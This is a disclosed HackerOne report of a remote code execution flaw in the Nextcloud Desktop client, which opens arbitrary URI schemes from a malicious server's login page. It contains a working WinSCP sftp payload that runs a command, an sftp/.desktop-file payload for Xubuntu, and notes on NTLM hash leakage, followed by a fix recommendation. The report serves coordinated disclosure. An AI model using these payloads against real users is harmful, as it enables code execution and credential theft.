# Nextcloud Desktop Client RCE via malicious URI schemes

## Report Details
- **Report ID**: 1078002
- **URL**: https://hackerone.com/reports/1078002
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-13T17:29:19.280Z
- **Disclosed**: 2021-04-15T09:17:05.240Z

## Reporter
- **Username**: 7a69
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Nextcloud Desktop utilizes QT's `QDesktopServices::openUrl()` to open URLs. This function invokes the OS'/Desktop environment's default application to handling the URI scheme and file extension.

During the Nextcloud `Add Account` flow, the server's login website is opened within a native window/`WebView`. A malicious server can serve a login website containing links with arbitrary URI schemes. Clicking those links immediately invokes the OS' default application to handle the URI.

This can be exploited in various ways, depending on the OS and configuration, to e.g. gain arbitrary code execution:

## Exploitation on Windows

Many Windows developers and users in need of an scp/sftp/ftp/s3 client install 3rd party software, with WinSCP being the most common by far (2.1m downloads since 2020-11-20, >150m overall). Nextcloud Desktop Windows users that have WinSCP installed can be immediately exploited through the following link:
- `sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/`  (not shown to the user in the connection assistant window, even on hover)

A demo video is attached.
This utilizes "advanced" connection settings that are parsed by WinSCP when opening an sftp link. By specifying the "Local" proxy mode, an arbitrary command can be set, ran immediately even before the connection is established.

### Default config

Other abusable URI schemes are e.g. `file://` and `dav(s)://`. Those can leak NTLM hashes and, by referencing remote executables (.exe/.bat/.com/...) also lead to RCE on hosts that don't have WinSCP installed (with a confirmation needed to run the application).

## Exploitation on Linux (Xubuntu 20.04)

On Linux, the exact opening behavior and therefore exploitation strategy is dependent on the Desktop Environment and its configuration. As an example, serving the following URL allows to run arbitrary code on Xubuntu 20.04 in its default configuration:
- `sftp://nextclouduser@<server>/example.desktop`

A demo video is attached.
By specifying a username that is configured with an empty password on the server, this remote location is auto-mounted and the .desktop file (with executable-flag set) is opened with its default application, which will execute the specified command [1].
Please note: As seen in the video, if the client has never connected via SSH to the host before, the user is asked to accept the SSH host key. However, this prompt is perfectly embedded in the login flow (showing the same Nextcloud server address and the note that "this happens when you login for the first time").

Also, please note, that depending on the system configuration, also other URI schemes and file types can be used for exploitation, e.g. `smb://` for loading remote samba shares, and `.jar` files to run Java programs.

## Recommendation

Use a strict allowlist to filter all URLs before passing them to QDesktopServices::openURL(). 
For the login window, I think the responsible code is [here](https://github.com/nextcloud/desktop/blob/4b985ab3b322d18773c76e1d1afd6cbad3cdbba2/src/gui/wizard/webview.cpp#L226:L232). Only the "http://" and "https://" URI scheme should be allowed here.
All [QDesktopServices::openURL() calls](https://github.com/nextcloud/desktop/search?q=openURL) should be checked to verify that no unvalidated user/server input is be passed.


[1] .desktop file:
  [Desktop Entry]
  Exec=xmessage "Arbitrary RCE :)"
  Type=Application

## Impact

Arbitrary code execution and NTLM hash leak.

## Attachments
- nextcloud_rce_win.mp4
- nextcloud_rce_xubuntu.mp4
